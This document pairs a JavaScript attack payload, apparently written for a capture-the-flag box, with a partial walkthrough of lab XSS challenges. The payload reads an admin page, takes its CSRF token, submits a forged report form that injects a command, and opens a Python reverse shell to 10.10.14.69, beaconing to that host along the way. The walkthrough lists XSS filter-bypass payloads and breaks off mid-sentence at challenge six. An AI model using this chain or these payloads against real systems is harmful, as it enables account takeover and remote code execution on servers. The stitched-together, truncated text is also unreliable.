var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://thing.edu:2222/administration", true);
xmlHttp.send( null );
// confirm
//
//
var x = document.createElement("IMG");
x.src = 'http://10.10.14.69/?first';
//
//

setTimeout(function() {
    // confirm
    //
    //
    var x = document.createElement("IMG");
    x.src = 'http://10.10.14.69/?second';
    // grab token
    //
    //
    var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html');
    var token = doc.getElementById('authenticity_token').value;
    // conjure form
    var newForm = new DOMParser().parseFromString('<form id="hacks" method="post" action="/administration/reports">    <input type="hidden" name="authenticity_token" id="authenticity_token" value="placeholder" autocomplete="off">    <input id="report_log" type="text" class="form-control" name="report_log" value="placeholder" hidden="">    <button name="button" type="submit">Submit</button>', 'text/html');
    document.body.append(newForm.forms.hacks);
    // values
    //
    //
    document.getElementById('hacks').elements.report_log.value = '|/usr/bin/python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.69",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("bash")';
    document.getElementById('hacks').elements.authenticity_token.value = token;
    document.getElementById('hacks').submit();
}, 2000);

//
//
//
///////////////
///////////////
//
//


XSS Challenges..!
Let’s begin with Cross Site Scripting (XSS) challenge.

Cross Site Scripting :- an attacker can inject any malicious JavaScript into (user input field, filename, referral URL, html header) application to perform unintentional actions like gaining user session, steal sensitive information, deface website or redirect the user to the malicious site

Challenge_1

Our first challenge solution is easy, we just need to inject/insert a simple script like

<script>alert(‘XSS’)</script>

into the URL like http://192.168.233.139/xss/example1.php?name=hacker <script>alert(‘XSS’) </script>


POC for XSS 2
Challenge_2

In XSS challenge 2 if we tried with simple javascript <script>alert(‘XSS’)</script> but it shows the only content inside the script& it does not execute, so we need to bypass the script by capitalizing the <script> tag to <SCRIPT>

<SCRIPT>alert(‘XSS’)</SCRIPT>

Now try with a bypassed script into the URL the like http://192.168.233.139/xss/example1.php?name=hacker <SCRIPT>alert(‘XSS’) </SCRIPT>


POC for XSS 2
Challenge_3

Proceeding with challenge 3, it seems to be the same as previous challenges, but if we tried with earlier script web application only shows the content not executing the inserted script.

We need to think out of the box to bypass the script. How about if we wrap(script inside the script) our script like below

<scri<SCRIPT>pt>alert(‘xss’)</scri</SCRIPT>pt>

Now we try with our new URL

http://192.168.233.139/xss/example3.php?name=hacker<scri<SCRIPT>pt>alert(‘xss’)</scri</SCRIPT>pt>


POC for XSS 3
Challenge _4

In this challenge, if we inject any malicious script it gives the ‘error’.

To bypass this condition we can use a script of onerror tag like

<IMG SRC=xyz.png onerror=”alert(‘xxs’)”>

Now try with this as below in URL

http://192.168.233.139/xss/example4.php?name=hacker<IMG SRC=xyz.png onerror=“alert(‘xxs’)”>


POC for XSS 4
Challenge_5

This challenge seems to be trickier as compare to earlier challenges. By injecting various malicious script observed that application sanitize the ‘alert’ keyword, but the application is executing the script.


Script gets executed
To bypass the ‘alert’ keyword we can use eval() function which will evaluate the expression.

Have look at below expression which will convert the ASCII value of alert(‘XSS’) into the string with eval() function.

<script> eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41)) </script>

Now when we inject code into URL our URL will be

http://192.168.233.139/xss/example3.php?name=hacker<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>


POC for XSS 5
Challenge_6

As we are dragging our head to solve such difficult challenges, challenge 6 seems to be an easy one, as if we inject any simple javascript payload we get a “; content on screen.

//
//
//
